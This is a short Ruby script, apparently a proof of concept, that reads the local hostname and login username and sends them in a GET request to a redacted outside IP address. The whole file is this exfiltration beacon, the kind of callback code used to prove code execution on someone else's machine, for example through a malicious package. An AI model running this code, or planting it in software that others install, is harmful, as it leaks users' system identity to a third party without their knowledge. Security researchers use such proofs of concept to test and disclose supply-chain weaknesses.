#!/usr/bin/env ruby
# Adapted from Bryan's Python
# A simple script to generate a GET request to a specified URL
# Author: Joseph Erdosy
#
# This script sends a GET request to a specified URL with the
# hostname and username as URL parameters.

require 'net/http'
require 'socket'
require 'etc'

# Customize IP and port here
ip = 'REDACTED'
port = 80

# Get hostname and username
hostname = Socket.gethostname
username = Etc.getlogin

# Build the URL
url = "http://#{ip}:#{port}/?userforthisspecificpoc=#{hostname}%5C#{username}"

# Send the GET request
uri = URI(url)
response = Net::HTTP.get_response(uri)

# Print the response
puts response.body